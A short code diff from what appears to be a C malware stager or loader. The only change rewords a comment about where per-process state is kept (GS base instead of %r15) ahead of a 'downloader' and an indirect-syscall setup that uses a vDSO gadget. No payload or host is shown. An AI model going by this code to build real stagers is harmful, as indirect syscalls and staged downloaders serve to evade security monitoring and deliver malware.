@@ -67,8 +67,8 @@ static void stage_run(void *arg) {
 
 static void stub_main(void) __attribute__((used));
 static void stub_main(void) {
-  /* Per-process mutable state (%r15) and the vDSO syscall gadget must exist
-   * before the downloader runs; the downloader reuses the same state. */
+  /* Per-process mutable state (GS base) and the vDSO syscall gadget must
+   * exist before the downloader runs; the downloader reuses the same state. */
   stager_state_init();
   init_indirect_syscalls();
 
